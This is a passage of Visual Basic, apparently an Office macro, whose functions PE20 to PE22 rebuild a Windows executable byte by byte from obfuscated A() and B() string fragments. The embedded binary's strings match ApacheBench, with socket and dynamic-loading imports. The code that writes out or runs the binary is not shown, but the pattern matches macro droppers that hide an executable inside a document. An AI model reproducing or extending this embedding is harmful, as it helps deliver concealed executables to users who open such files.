    strPE = A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(strPE, 0), "@"), 143), "@"), 0), 0), 0), 0), 0), 0), 240), "?"), 0), 0), 0), 0), 0), 0), 0), 0), 141), 237), 181), 160), 247), 198), 176), ">"), 0), 0), 0), 0), 31), 0), 0), 0), ";"), 0), 0), 0), "Z"), 0), 0), 0), "x"), 0), 0), 0), 151), 0)
    strPE = A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 181), 0), 0), 0), 212), 0), 0), 0), 243), 0), 0), 0), 17), 1), 0), 0), "0"), 1), 0), 0), "N"), 1), 0), 0), "2"), 1), 0), 0), "Q"), 1), 0), 0), 0), 0), 0), 0), 31), 0), 0), 0), "="), 0), 0), 0), "\"), 0), 0), 0)
    strPE = A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "z"), 0), 0), 0), 153), 0), 0), 0), 184), 0), 0), 0), 214), 0), 0), 0), 245), 0), 0), 0), 19), 1), 0), 0), "(null)"), 0), 0), "0123456789abcdef"), 0), 0)
    strPE = B(A(A(A(A(B(A(A(A(A(B(A(A(strPE, 0), 0), "0123456789ABCDEF"), 0), 0), 0), 0), "0123456789abcdef"), 0), 0), 0), 0), "01234567")
    strPE = A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(strPE, "89ABCDEF"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "$@"), 0), 0), 0), 0), 0), 0), "$"), 192), 184), 30), 133), 235), "Q"), 184), 158), "?"), 154), 153), 153), 153), 153), 153), 185), "?"), 20), "'"), 0), 0), "<"), 249)
    strPE = A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(B(strPE, "@"), 0), 25), "'"), 0), 0), ","), 249), "@"), 0), 29), "'"), 0), 0), 24), 249), "@"), 0), 30), "'"), 0), 0), 12), 249), "@"), 0), "&'"), 0), 0), 248), 248), "@"), 0), "('"), 0), 0), 224), 248), "@"), 0), "3'"), 0), 0), 200), 248), "@"), 0)
    strPE = B(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(strPE, "4'"), 0), 0), 172), 248), "@"), 0), "5'"), 0), 0), 140), 248), "@"), 0), "6'"), 0), 0), "l"), 248), "@"), 0), "7'"), 0), 0), "L"), 248), "@"), 0), "8'"), 0), 0), "8"), 248), "@"), 0), "9'"), 0), 0), 24), 248), "@"), 0), ":'")
    strPE = A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(strPE, 0), 0), 4), 248), "@"), 0), ";'"), 0), 0), 236), 247), "@"), 0), "<'"), 0), 0), 208), 247), "@"), 0), "='"), 0), 0), 172), 247), "@"), 0), ">'"), 0), 0), 140), 247), "@"), 0), "?'"), 0), 0), "l"), 247), "@"), 0), "@'"), 0), 0)
    strPE = A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(B(strPE, "T"), 247), "@"), 0), "A'"), 0), 0), "4"), 247), "@"), 0), "B'"), 0), 0), "$"), 247), "@"), 0), "C'"), 0), 0), 12), 247), "@"), 0), "D'"), 0), 0), 244), 246), "@"), 0), "E'"), 0), 0), 208), 246), "@"), 0), "F'"), 0), 0), 180), 246)
    strPE = A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(B(strPE, "@"), 0), "G'"), 0), 0), 152), 246), "@"), 0), "H'"), 0), 0), "|"), 246), "@"), 0), "I'"), 0), 0), "d"), 246), "@"), 0), "J'"), 0), 0), "@"), 246), "@"), 0), "K'"), 0), 0), 28), 246), "@"), 0), "L'"), 0), 0), 4), 246), "@"), 0)
    strPE = B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(strPE, "M'"), 0), 0), 240), 245), "@"), 0), "N'"), 0), 0), 204), 245), "@"), 0), "O'"), 0), 0), 184), 245), "@"), 0), "P'"), 0), 0), 168), 245), "@"), 0), "Q'"), 0), 0), 148), 245), "@"), 0), "R'"), 0), 0), 128), 245), "@"), 0), "S'")
    strPE = A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(strPE, 0), 0), "l"), 245), "@"), 0), "T'"), 0), 0), "\"), 245), "@"), 0), "U'"), 0), 0), "H"), 245), "@"), 0), "V'"), 0), 0), "0"), 245), "@"), 0), "W'"), 0), 0), 12), 245), "@"), 0), "k'"), 0), 0), 236), 244), "@"), 0), "l'"), 0), 0)
    strPE = B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(strPE, 204), 244), "@"), 0), "m'"), 0), 0), 176), 244), "@"), 0), "u'"), 0), 0), 144), 244), "@"), 0), 249), "*"), 0), 0), 128), 244), "@"), 0), 252), "*"), 0), 0), "\"), 244), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), "Jan"), 0), "Fe")
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "b"), 0), "Mar"), 0), "Apr"), 0), "May"), 0), "Jun"), 0), "Jul"), 0), "Aug"), 0), "Sep"), 0), "Oct"), 0), "Nov"), 0), "Dec"), 0), "Sun"), 0), "Mon"), 0)
    strPE = B(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "Tue"), 0), "Wed"), 0), "Thu"), 0), "Fri"), 0), "Sat"), 0), "<"), 2), "A"), 0), "0"), 2), "A"), 0), "("), 2), "A"), 0), " "), 2), "A"), 0), 24), 2), "A"), 0), 12), 2), "A"), 0), "012345")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "6789"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 2), 0), 0), 2), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 1), 1), 2), 1), 3), 3), 3), 3), 3), 3), 2), 1)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 1), 1), 1), 0), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 0), 3), 2), 1), 2), 2), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 3), 2), 3)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 3), 1), 3), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 3), 2), 3), 3), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1)
    strPE = B(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), 1), "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "@@@@@>@@@?456789:;<=@@@@@@@"), 0), 1), 2), 3), 4), 5), 6), 7), 8), 9), 10), 11), 12), 13), 14), 15), 16), 17), 18), 19), 20), 21), 22)
    strPE = B(A(B(A(A(A(A(A(A(B(A(A(A(strPE, 23), 24), 25), "@@@@@@"), 26), 27), 28), 29), 30), 31), " !"), 34), "#$%&'()*+,-./0123@@@@@@@@@@@@@@@")
    strPE = B(strPE, "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    strPE = B(strPE, "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    strPE = B(strPE, "@@@@@@@@@@@@@@@@@@ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef")
    strPE = A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "ghijklmnopqrstuvwxyz0123456789+/"), 0), 0), 0), 0), 0), 0), 0), 0), 255), 255), 255), 255), "*"), 183), "@"), 0), ">"), 183)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "@"), 0), 172), 200), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 30), 203), 0), 0), 200), 192), 0), 0), 240), 199), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "b"), 207), 0), 0), 12), 192), 0), 0), 228), 199), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 150), 207), 0), 0), 0), 192), 0), 0), 132), 201), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 164), 207), 0), 0), 160), 193), 0), 0), "x"), 201), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 196), 207), 0), 0), 148), 193)
    strPE = A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 140), 207), 0), 0), "p"), 207), 0), 0), 0), 0), 0), 0), "R"), 207), 0), 0), "F"), 207), 0), 0), ":"), 207), 0), 0), "*"), 207), 0), 0)
    strPE = A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 24), 207), 0), 0), 8), 207), 0), 0), 242), 206), 0), 0), 222), 206), 0), 0), 198), 206), 0), 0), 186), 206), 0), 0), 170), 206), 0), 0), 146), 206), 0), 0), "z"), 206), 0), 0), "^"), 206), 0), 0), "N"), 206), 0), 0), "@"), 206), 0), 0), 250), 203)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(strPE, 0), 0), 10), 204), 0), 0), "$"), 204), 0), 0), ">"), 204), 0), 0), "L"), 204), 0), 0), "^"), 204), 0), 0), "j"), 204), 0), 0), "t"), 204), 0), 0), 134), 204), 0), 0), 154), 204), 0), 0), 178), 204), 0), 0), 192), 204), 0), 0), 218), 204), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 242), 204), 0), 0), 12), 205), 0), 0), "&"), 205), 0), 0), ">"), 205), 0), 0), "`"), 205), 0), 0), "h"), 205), 0), 0), "z"), 205), 0), 0), 138), 205), 0), 0), 160), 205), 0), 0), 176), 205), 0), 0), 192), 205), 0), 0), 210), 205), 0), 0), 224), 205)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 238), 205), 0), 0), 4), 206), 0), 0), 22), 206), 0), 0), "4"), 206), 0), 0), 0), 0), 0), 0), 196), 201), 0), 0), 216), 203), 0), 0), 198), 203), 0), 0), 184), 203), 0), 0), 168), 203), 0), 0), 152), 203), 0), 0), 132), 203), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(strPE, "x"), 203), 0), 0), "h"), 203), 0), 0), "X"), 203), 0), 0), "J"), 203), 0), 0), "B"), 203), 0), 0), "8"), 203), 0), 0), "*"), 203), 0), 0), 20), 203), 0), 0), 10), 203), 0), 0), 0), 203), 0), 0), 246), 202), 0), 0), 236), 202), 0), 0), 224), 202)

    PE20 = strPE
End Function

Private Function PE21() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 216), 202), 0), 0), 206), 202), 0), 0), 196), 202), 0), 0), 180), 202), 0), 0), 164), 202), 0), 0), 154), 202), 0), 0), 146), 202), 0), 0), 136), 202), 0), 0), "~"), 202), 0), 0), "t"), 202), 0), 0), "l"), 202), 0), 0), "d"), 202), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(strPE, "\"), 202), 0), 0), "R"), 202), 0), 0), "H"), 202), 0), 0), ">"), 202), 0), 0), "4"), 202), 0), 0), "*"), 202), 0), 0), " "), 202), 0), 0), 22), 202), 0), 0), 10), 202), 0), 0), 2), 202), 0), 0), 250), 201), 0), 0), 234), 201), 0), 0), 224), 201)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 214), 201), 0), 0), 204), 201), 0), 0), 236), 203), 0), 0), 220), 207), 0), 0), 208), 207), 0), 0), 0), 0), 0), 0), 186), 207), 0), 0), 176), 207), 0), 0), 0), 0), 0), 0), 7), 0), 0), 128), 4), 0), 0), 128), 9), 0), 0), 128)
    strPE = A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "4"), 0), 0), 128), 14), 0), 0), 128), 12), 0), 0), 128), 21), 0), 0), 128), 23), 0), 0), 128), 3), 0), 0), 128), 18), 0), 0), 128), 10), 0), 0), 128), 151), 0), 0), 128), "s"), 0), 0), 128), "t"), 0), 0), 128), "o"), 0), 0), 128), 0), 0)
    strPE = B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(strPE, 0), 0), 19), 1), "_iob"), 0), 0), "X"), 2), "fprintf"), 0), 183), 2), "strchr"), 0), 0), 142), 1), "_pctype"), 0), "a"), 0), "__mb_cur")
    strPE = B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(strPE, "_max"), 0), 0), "I"), 2), "exit"), 0), 0), "="), 2), "atoi"), 0), 0), 21), 1), "_isctype"), 0), 0), 158), 2), "printf"), 0), 0), 175), 2), "sign")
    strPE = B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(strPE, "al"), 0), 0), 145), 2), "malloc"), 0), 0), "@"), 2), "calloc"), 0), 0), "O"), 2), "fflush"), 0), 0), "L"), 2), "fclose"), 0), 0), 156), 2), "perr")
    strPE = A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(strPE, "or"), 0), 0), "W"), 2), "fopen"), 0), 164), 2), "qsort"), 0), 241), 0), "_ftol"), 0), 193), 2), "strncpy"), 0), 197), 2), "strstr"), 0), 0), 192), 2)
    strPE = B(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(B(strPE, "strncmp"), 0), "^"), 2), "free"), 0), 0), 200), 0), "_errno"), 0), 0), "z"), 0), "__p__wenviron"), 0), "m"), 0), "__p__e")
    strPE = A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(B(strPE, "nviron"), 0), 0), 167), 2), "realloc"), 0), 196), 2), "strspn"), 0), 0), 155), 2), "modf"), 0), 0), 188), 2), "strerror"), 0), 0), 227), 2)
    strPE = B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(strPE, "wcscpy"), 0), 0), 230), 2), "wcslen"), 0), 0), 179), 0), "_close"), 0), 0), 232), 2), "wcsncmp"), 0), 195), 2), "strrchr"), 0), "MS")
    strPE = B(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(strPE, "VCRT.dll"), 0), 0), "U"), 0), "__dllonexit"), 0), 134), 1), "_onexit"), 0), 211), 0), "_exit"), 0), "H"), 0), "_XcptF")
    strPE = A(B(A(A(A(B(A(B(A(B(A(B(A(B(strPE, "ilter"), 0), "d"), 0), "__p___initenv"), 0), "X"), 0), "__getmainargs"), 0), 15), 1), "_initterm"), 0)
    strPE = B(A(B(A(A(B(A(A(A(A(B(A(A(strPE, 131), 0), "__setusermatherr"), 0), 0), 157), 0), "_adjust_fdiv"), 0), 0), "j"), 0), "__p__commode")
    strPE = B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(strPE, 0), 0), "o"), 0), "__p__fmode"), 0), 0), 129), 0), "__set_app_type"), 0), 0), 202), 0), "_except_handle")
    strPE = B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(strPE, "r3"), 0), 0), 183), 0), "_controlfp"), 0), 0), 29), 3), "SetLastError"), 0), 0), 238), 0), "FreeEnvironmen")
    strPE = A(A(B(A(A(A(A(B(A(B(A(B(strPE, "tStringsW"), 0), "O"), 1), "GetEnvironmentStringsW"), 0), 0), 245), 1), "GlobalFree"), 0), 0)
    strPE = B(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(strPE, 9), 1), "GetCommandLineW"), 0), "V"), 3), "TlsAlloc"), 0), 0), "W"), 3), "TlsFree"), 0), 140), 0), "Duplicat")
    strPE = B(A(A(A(B(A(B(A(B(strPE, "eHandle"), 0), ":"), 1), "GetCurrentProcess"), 0), 26), 3), "SetHandleInformation")
    strPE = B(A(A(A(B(A(A(A(B(A(B(A(A(strPE, 0), 0), "."), 0), "CloseHandle"), 0), 192), 1), "GetSystemTimeAsFileTime"), 0), 188), 0), "FileTi")
    strPE = B(A(A(A(A(B(A(A(A(A(B(strPE, "meToSystemTime"), 0), 0), 216), 1), "GetTimeZoneInformation"), 0), 0), 187), 0), "FileTi")
    strPE = B(A(B(A(A(B(A(B(A(B(strPE, "meToLocalFileTime"), 0), "N"), 3), "SystemTimeToFileTime"), 0), 0), "O"), 3), "System")
    strPE = B(A(A(A(B(A(B(A(B(strPE, "TimeToTzSpecificLocalTime"), 0), "I"), 3), "Sleep"), 0), 234), 0), "FormatMessageA")
    strPE = B(A(B(A(B(A(A(A(A(B(A(B(A(A(strPE, 0), 0), "i"), 1), "GetLastError"), 0), 0), 133), 3), "WaitForSingleObject"), 0), "I"), 0), "CreateEv")
    strPE = B(A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(strPE, "entA"), 0), 0), ","), 3), "SetStdHandle"), 0), 0), 16), 3), "SetFilePointer"), 0), 0), "M"), 0), "CreateFi")
    strPE = B(A(A(A(B(A(A(A(B(A(B(A(B(strPE, "leA"), 0), "P"), 0), "CreateFileW"), 0), 140), 1), "GetOverlappedResult"), 0), 131), 0), "DeviceIo")
    strPE = A(B(A(B(A(A(B(A(B(A(B(strPE, "Control"), 0), "Z"), 1), "GetFileInformationByHandle"), 0), 0), "R"), 2), "LocalFree"), 0)
    strPE = B(A(A(A(A(B(A(B(A(B(A(B(strPE, "^"), 1), "GetFileType"), 0), "Z"), 0), "CreateMutexA"), 0), 0), 25), 2), "InitializeCritical")
    strPE = B(A(A(A(B(A(B(A(B(strPE, "Section"), 0), "z"), 0), "DeleteCriticalSection"), 0), 143), 0), "EnterCriticalSec")
    strPE = B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(strPE, "tion"), 0), 0), 184), 2), "ReleaseMutex"), 0), 0), 11), 3), "SetEvent"), 0), 0), "G"), 2), "LeaveCriticalS")
    strPE = A(A(B(A(B(A(A(B(A(B(A(A(B(strPE, "ection"), 0), 0), "Q"), 3), "TerminateProcess"), 0), 0), "R"), 1), "GetExitCodeProcess"), 0), 0)
    strPE = A(A(B(A(B(A(A(B(A(A(A(B(A(A(strPE, 223), 1), "GetVersionExA"), 0), 152), 1), "GetProcAddress"), 0), 0), "H"), 2), "LoadLibraryA"), 0), 0)
    strPE = B(A(B(A(A(A(A(B(A(A(A(B(A(A(strPE, 151), 3), "WriteFile"), 0), 171), 2), "ReadFile"), 0), 0), 135), 2), "PeekNamedPipe"), 0), "KERNEL32.d")
    strPE = B(A(B(A(A(A(A(B(A(A(A(A(B(strPE, "ll"), 0), 0), 29), 0), "AllocateAndInitializeSid"), 0), 0), 225), 0), "FreeSid"), 0), "ADVAPI32")
    strPE = A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(strPE, ".dll"), 0), 0), "WSOCK32.dll"), 0), "9"), 0), "WSASend"), 0), "4"), 0), "WSARecv"), 0), "WS2_32.dll"), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(strPE, 197), 1), "_strnicmp"), 0), 191), 1), "_strdup"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 1), 0), 0), 0), "d"), 0), 0), 0), 1), 0), 0), 0), 1), 0), 0), 0), 1), 0), 0), 0), 0), 0), 0), 0), 128), 195), 201), 1), 0), 0), 0), 0), 224), 11), "A"), 0)
    strPE = B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(strPE, "2"), 0), 0), 0), "B"), 0), 0), 0), "K"), 0), 0), 0), "P"), 0), 0), 0), "Z"), 0), 0), 0), "_"), 0), 0), 0), "b"), 0), 0), 0), "c"), 0), 0), 0), "d"), 0), 0), 0), "%s: Cannot use")
    strPE = B(strPE, " concurrency level greater than total number of re")
    strPE = B(A(A(A(B(A(A(B(strPE, "quests"), 10), 0), "%s: Invalid Concurrency [Range 0..%d]"), 10), 0), 0), "%s")
    strPE = A(A(A(B(A(A(A(A(A(B(strPE, ": invalid URL"), 10), 0), 0), 0), 0), "%s: wrong number of arguments"), 10), 0), 0)
    strPE = B(A(A(A(B(A(B(A(B(strPE, "User-Agent:"), 0), "Accept:"), 0), "Host:"), 0), 0), 0), "Proxy-Authorization: B")
    strPE = B(A(A(B(A(B(strPE, "asic "), 0), "Proxy credentials too long"), 10), 0), "Authorization: B")
    strPE = B(A(A(A(A(A(B(A(A(A(B(strPE, "asic "), 0), 0), 0), "Authentication credentials too long"), 10), 0), 0), 0), 0), "Co")
    strPE = B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(strPE, "okie: "), 0), 0), 0), 0), 13), 10), 0), 0), "Cannot mix PUT and HEAD"), 10), 0), 0), 0), 0), "Cannot m")
    strPE = A(A(B(A(A(A(A(B(strPE, "ix POST and HEAD"), 10), 0), 0), 0), "Cannot mix POST/PUT and HEAD"), 10), 0)
    strPE = B(A(A(B(A(A(strPE, 0), 0), "Invalid number of requests"), 10), 0), "n:c:t:b:T:p:u:v:rkVh")
    strPE = B(A(A(A(B(A(A(A(B(strPE, "wix:y:z:C:H:P:A:g:X:de:Sq"), 0), 0), 0), "bgcolor=white"), 0), 0), 0), "Total ")
    strPE = B(A(A(B(A(A(B(A(A(B(strPE, "of %d requests completed"), 10), 0), "%s"), 10), 0), "..done"), 10), 0), "Finished %d ")

    PE21 = strPE
End Function

Private Function PE22() As String
   Dim strPE As String

    strPE = ""
    strPE = B(A(A(A(A(A(B(A(A(A(A(B(strPE, "requests"), 10), 0), 0), 0), "apr_socket_connect()"), 0), 0), 0), 0), 10), "Test aborted ")
    strPE = B(A(A(A(B(A(A(A(A(A(A(B(strPE, "after 10 failures"), 10), 10), 0), 0), 0), 10), "Server timed out"), 10), 10), 0), "apr_poll")
    strPE = B(A(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "apr_sockaddr_info_get() for %s"), 0), 0), "error creating")
    strPE = B(A(A(A(A(B(strPE, " request buffer: out of memory"), 10), 0), 0), 0), "INFO: %s header ")
    strPE = B(A(A(A(A(B(A(A(B(A(B(A(B(A(B(strPE, "== "), 10), "---"), 10), "%s"), 10), "---"), 10), 0), "Request too long"), 10), 0), 0), 0), "%s %s HTTP/1.0")
    strPE = A(A(B(A(A(B(A(A(B(A(A(strPE, 13), 10), "%s%s%sContent-length: %u"), 13), 10), "Content-type: %s"), 13), 10), "%s"), 13), 10)
    strPE = B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "PUT"), 0), "POST"), 0), 0), 0), 0), "text/plain"), 0), 0), "%s %s HTTP/1.0"), 13), 10), "%s%s%s")
    strPE = B(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(strPE, "%s"), 13), 10), 0), 0), "HEAD"), 0), 0), 0), 0), "GET"), 0), "Connection: Keep-Alive"), 13), 10), 0), 0), 0), 0), "Acce")
    strPE = B(A(B(A(A(A(A(B(A(A(A(A(A(B(strPE, "pt: */*"), 13), 10), 0), 0), 0), "User-Agent: ApacheBench/"), 0), 0), 0), 0), "2.3"), 0), "Host: ")
    strPE = A(B(A(A(B(A(A(A(B(A(A(strPE, 0), 0), "apr_pollset_create failed"), 0), 0), 0), "(be patient)%s"), 0), 0), "..."), 0)
    strPE = B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(strPE, 10), 0), 0), 0), "[through %s:%d] "), 0), 0), 0), 0), "Benchmarking %s "), 0), 0), 0), 0), "%s: %s")
    strPE = B(A(A(A(A(B(A(A(A(A(A(B(strPE, " (%d)"), 10), 0), 0), 0), 0), "Send request failed!"), 10), 0), 0), 0), "Send request tim")
    strPE = B(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(strPE, "ed out!"), 10), 0), 0), 0), 0), "%s"), 9), "%I64d"), 9), "%I64d"), 9), "%I64d"), 9), "%I64d"), 9), "%I64d"), 10), 0), 0), 0), "st")
    strPE = B(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "arttime"), 9), "seconds"), 9), "ctime"), 9), "dtime"), 9), "ttime"), 9), "wait"), 10), 0), 0), 0), "Cannot o")
    strPE = B(A(A(A(A(A(B(A(B(strPE, "pen gnuplot output file"), 0), "%d,%.3f"), 10), 0), 0), 0), 0), "Percentage ser")
